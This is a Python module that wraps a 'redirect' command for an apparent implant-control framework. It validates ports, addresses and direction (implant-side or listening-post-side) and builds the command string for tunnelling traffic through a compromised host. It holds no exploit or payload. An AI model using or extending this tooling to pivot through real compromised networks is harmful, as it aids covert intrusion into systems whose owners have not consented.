
import ops.cmd
import dsz
import dsz.cmd
import util.ip
from ops.cmd import OpsCommandException
TCP = 'tcp'
UDP = 'udp'
IMPLANTLISTEN = 'implantlisten'
LPLISTEN = 'lplisten'
VALID_OPTIONS = ['lplisten', 'implantlisten', 'target', 'tcp', 'udp', 'portsharing', 'connections', 'limitconnections', 'sendnotify', 'packetsize']

class RedirectCommand(ops.cmd.DszCommand, ):

    def __init__(self, plugin='redirect', lplisten=None, implantlisten=None, target=None, **optdict):
        self._listenport = (-1)
        self._bindAddr = '0.0.0.0'
        self._direction = None
        self._clientPort = (-1)
        self._clientAddr = '0.0.0.0'
        self._targetAddr = '0.0.0.0'
        self._targetPort = (-1)
        self._sourceAddr = '0.0.0.0'
        self._sourcePort = (-1)
        self._limitAddr = '0.0.0.0'
        self._limitMask = '0.0.0.0'
        self.optdict = optdict
        if ('protocol' in optdict):
            self.protocol = optdict['protocol']
            del optdict['protocol']
        elif ('tcp' in optdict):
            self.protocol = 'tcp'
        elif ('udp' in optdict):
            self.protocol = 'udp'
        if ((lplisten is not None) and (implantlisten is not None)):
            raise OpsCommandException('You can only set one of lplisten and implantlisten')
        elif (lplisten is not None):
            if ((type(lplisten) == bool) and lplisten):
                self.direction = 'lplisten'
            else:
                self.lplisten = lplisten
        elif (implantlisten is not None):
            if ((type(implantlisten) == bool) and implantlisten):
                self.direction = 'implantlisten'
            else:
                self.implantlisten = implantlisten
        self.target = target
        delmark = []
        for key in optdict:
            if ((not (key in VALID_OPTIONS)) or (key in ['lplisten', 'implantlisten', 'target'])):
                delmark.append(key)
        for deler in delmark:
            del optdict[deler]
        ops.cmd.DszCommand.__init__(self, plugin=plugin, **optdict)

    def validateInput(self):
        if (self.target_address == '0.0.0.0'):
            return False
        if ((self.target_port < 0) or (self.target_port > 65535)):
            return False
        if ((self.listen_port < 0) or (self.listen_port > 65535)):
            return False
        if ((self.lplisten is None) and (self.implantlisten is None)):
            return False
        if (self.protocol is None):
            return False
        for port in [self.source_port, self.client_port]:
            if ((port < (-1)) or (port > 65535)):
                return False
        return True

    def __str__(self):
        cmdstr = ''
        for prefix in self.prefixes:
            cmdstr += ('%s ' % prefix)
        cmdstr += ('%s -%s -target %s' % (self.plugin, self.protocol, self.target))
        if (self.lplisten is not None):
            cmdstr += (' -lplisten %s' % self.lplisten)
        elif (self.implantlisten is not None):
            cmdstr += (' -implantlisten %s' % self.implantlisten)
        if self.port_sharing:
            cmdstr += (' -portsharing %s' % self.port_sharing)
        if self.limit_connections:
            cmdstr += (' -limitconnections %s' % self.limit_connections)
        for optkey in self.optdict:
            if (optkey in ['tcp', 'udp']):
                continue
            if (self.optdict[optkey] == True):
                cmdstr += (' -%s' % optkey)
            else:
                cmdstr += (' -%s %s' % (optkey, self.optdict[optkey]))
        if self.dszquiet:
            x = dsz.control.Method()
            dsz.control.echo.Off()
        return cmdstr

    def _getProtocol(self):
        if self.tcp:
            return 'tcp'
        elif self.udp:
            return 'udp'
        else:
            return None

    def _setProtocol(self, val):
        if (val == TCP):
            self.tcp = True
        elif (val == UDP):
            self.udp = True
        else:
            raise OpsCommandException('Protocol must be tcp or udp')
    protocol = property(_getProtocol, _setProtocol)

    def _getTCP(self):
        if (('tcp' in self.optdict) and self.optdict['tcp']):
            return True
        else:
            return False

    def _setTCP(self, val):
        if (((val is None) or (val is False)) and ('tcp' in self.optdict)):
            del self.optdict['tcp']
        elif (val is True):
            self.optdict['tcp'] = val
        if ('udp' in self.optdict):
            del self.optdict['udp']
    tcp = property(_getTCP, _setTCP)

    def _getUDP(self):
        if (('udp' in self.optdict) and self.optdict['udp']):
            return True
        else:
            return False

    def _setUDP(self, val):
        if (((val is None) or (val is False)) and ('udp' in self.optdict)):
            del self.optdict['udp']
        elif (val is True):
            self.optdict['udp'] = val
        if ('tcp' in self.optdict):
            del self.optdict['tcp']
    udp = property(_getUDP, _setUDP)

    def _getDirection(self):
        return self._direction

    def _setDirection(self, val):
        if (not (val in [IMPLANTLISTEN, LPLISTEN])):
            raise OpsCommandException('redirect command: direction must be one of lplisten or implantlisten')
        self._direction = val
    direction = property(_getDirection, _setDirection)

    def _getListenPort(self):
        return self._listenport

    def _setListenPort(self, val):
        val = int(val)
        if ((val < 0) or (val > 65535)):
            raise OpsCommandException('Listen port must be an integer between 0-65535')
        self._listenport = val
    listen_port = property(_getListenPort, _setListenPort)

    def _getBindAddr(self):
        return self._bindAddr

    def _setBindAddr(self, val):
        if (val is None):
            self._bindAddr = '0.0.0.0'
        elif util.ip.validate(val):
            self._bindAddr = val
    bind_address = property(_getBindAddr, _setBindAddr)

    def _getLplisten(self):
        if (self.direction == LPLISTEN):
            retval = str(self.listen_port)
            if (self.bind_address != '0.0.0.0'):
                retval += (' %s' % self.bind_address)
            return retval
        else:
            return None

    def _setLplisten(self, value):
        if (value is None):
            self.direction = IMPLANTLISTEN
        self.direction = LPLISTEN
        if (type(value) == str):
            options = value.split(' ')
            if (len(options) == 2):
                (self.listen_port, self.bind_address) = (options[0], options[1])
            elif (len(options) == 1):
                self.listen_port = options[0]
        elif (type(value) == int):
            self.listen_port = value
    lplisten = property(_getLplisten, _setLplisten)

    def _getImplantlisten(self):
        if (self.direction == IMPLANTLISTEN):
            retval = str(self.listen_port)
            if (self.bind_address != '0.0.0.0'):
                retval += (' %s' % self.bind_address)
            return retval
        else:
            return None

    def _setImplantlisten(self, value):
        if (value is None):
            self.direction = LPLISTEN
        self.direction = IMPLANTLISTEN
        if (type(value) == str):
            options = value.split(' ')
            if (len(options) == 2):
                (self.listen_port, self.bind_address) = (options[0], options[1])
            elif (len(options) == 1):
                self.listen_port = options[0]
        elif (type(value) == int):
            self.listen_port = value
    implantlisten = property(_getImplantlisten, _setImplantlisten)

    def _getTargetAddr(self):
        return self._targetAddr

    def _setTargetAddr(self, value):
        value = value.strip()
        if util.ip.validate(value):
            self._targetAddr = value
        else:
            raise OpsCommandException('Invalid target IP address')
    target_address = property(_getTargetAddr, _setTargetAddr)

    def _getTargetPort(self):
        return self._targetPort

    def _setTargetPort(self, value):
        try:
            value = int(value)
        except ValueError:
            raise OpsCommandException('Invalid target port, must be an integer between 0-65535')
        self._targetPort = value
    target_port = property(_getTargetPort, _setTargetPort)

    def _getSourceAddr(self):
        return self._sourceAddr.strip()

    def _setSourceAddr(self, value):
        value = value.strip()
        if util.ip.validate(value):
            self._sourceAddr = value
        else:
            raise OpsCommandException(('Invalid source IP address %s' % value))
    source_address = property(_getSourceAddr, _setSourceAddr)

    def _getSourcePort(self):
        return self._sourcePort

    def _setSourcePort(self, value):
        try:
            value = int(value)
            if ((value < (-1)) or (value > 65535)):
                raise OpsCommandException('Invalid source port, must be an integer between 0-65535 or -1 for unspecified')
        except ValueError:
            raise OpsCommandException('Invalid source port, must be an integer between 0-65535')
        self._sourcePort = value
    source_port = property(_getSourcePort, _setSourcePort)

    def _getTarget(self):
        retval = ('%s %d' % (self.target_address, self.target_port))
        if (self.source_address != '0.0.0.0'):
            retval += (' %s' % self.source_address)
            if (self.source_port != (-1)):
                retval += (' %d' % self.source_port)
        return retval

    def _setTarget(self, value):
        if (value is None):
            self.target_address = '0.0.0.0'
            self.target_port = (-1)
            return
        parts = value.split(' ')
        if (len(parts) < 2):
            raise OpsCommandException('You must specify at least a target address and target port')
        self.target_address = parts[0]
        self.target_port = parts[1]
        if (len(parts) >= 3):
            self.source_address = parts[2]
        if (len(parts) == 4):
            self.source_port = parts[3]
    target = property(_getTarget, _setTarget)

    def _getClientAddr(self):
        return self._clientAddr

    def _setClientAddr(self, value):
        value = value.strip()
        if (value == '0.0.0.0'):
            raise OpsCommandException('Invalid client IP address 0.0.0.0')
        elif util.ip.validate(value):
            self._clientAddr = value
        else:
            raise OpsCommandException(('Invalid client IP address %s' % value))
    client_address = property(_getClientAddr, _setClientAddr)

    def _getClientPort(self):
        return self._clientPort

    def _setClientPort(self, value):
        try:
            value = int(value)
            if ((value < 0) or (value > 65535)):
                raise OpsCommandException('Invalid client port, must be an integer between 0-65535')
        except ValueError:
            raise OpsCommandException('Invalid client port, must be an integer between 0-65535')
        self._clientPort = value
    client_port = property(_getClientPort, _setClientPort)

    def _getPortsharing(self):
        if (self.client_port > (-1)):
            return ('%d %s' % (self.client_port, self.client_address))
        else:
            return None

    def _setPortsharing(self, value):
        if (value is None):
            (self.client_address == '0.0.0.0')
            self.client_port = (-1)
        else:
            parts = value.split(' ')
            if (len(parts) != 2):
                raise OpsCommandException('You must specify client source address and client source port and nothing else when using port sharing')
            self.client_address = parts[1]
            self.client_port = parts[0]
    port_sharing = property(_getPortsharing, _setPortsharing)

    def _getLimitAddr(self):
        return self._limitAddr

    def _setLimitAddr(self, value):
        value = value.strip()
        if (value == '0.0.0.0'):
            raise OpsCommandException('Invalid limit IP address 0.0.0.0')
        elif util.ip.validate(value):
            self._limitAddr = value
        else:
            raise OpsCommandException(('Invalid limit IP address %s' % value))
    limit_address = property(_getLimitAddr, _setLimitAddr)

    def _getLimitMask(self):
        return self._limitMask

    def _setLimitMask(self, value):
        value = value.strip()
        if util.ip.validate(value):
            self._limitMask = value
        else:
            raise OpsCommandException(('Invalid limit mask %s' % value))
    limit_mask = property(_getLimitMask, _setLimitMask)

    def _getLimitConnections(self):
        if (self.limit_address != '0.0.0.0'):
            return ('%s %s' % (self.limit_address, self.limit_mask))
        else:
            return None

    def _setLimitConnections(self, value):
        if (value is None):
            self.limit_address = '0.0.0.0'
            self.limit_mask = '0.0.0.0'
        else:
            parts = value.split(' ')
            if (len(parts) != 2):
                raise OpsCommandException('You must specify limit address and limit mask and nothing else when using connection limiting')
            self.limit_mask = parts[1]
            self.limit_address = parts[0]
    limit_connections = property(_getLimitConnections, _setLimitConnections)

    def _getConnections(self):
        if ('connections' in self.optdict):
            return self.optdict['connections']
        else:
            return 0

    def _setConnections(self, value):
        if (value is not None):
            try:
                value = int(value)
                self.optdict['connections'] = value
            except ValueError:
                raise OpsCommandException('Max connections for a redirect command must be an integer >= 0')
        else:
            self.optdict['connections'] = 0
    connections = property(_getConnections, _setConnections)

    def _getPacketsize(self):
        if ('packetsize' in self.optdict):
            return self.optdict['packetsize']
        else:
            return 0

    def _setPacketsize(self, value):
        if (value is not None):
            try:
                value = int(value)
                self.optdict['packetsize'] = value
            except ValueError:
                raise OpsCommandException('Packetsize for a redirect command must be an integer > 0')
        elif ('packetsize' in self.optdict):
            del self.optdict['packetsize']
    packetsize = property(_getPacketsize, _setPacketsize)

    def _getRedirNotify(self):
        if (('sendnotify' in self.optdict) and self.optdict['sendnotify']):
            return True
        else:
            return False

    def _setRedirNotify(self, val):
        if (((val is None) or (val is False)) and ('sendnotify' in self.optdict)):
            del self.optdict['sendnotify']
        elif (val is True):
            self.optdict['sendnotify'] = val
    redir_notify = property(_getRedirNotify, _setRedirNotify)
ops.cmd.command_classes['redirect'] = RedirectCommand
ops.cmd.aliasoptions['redirect'] = VALID_OPTIONS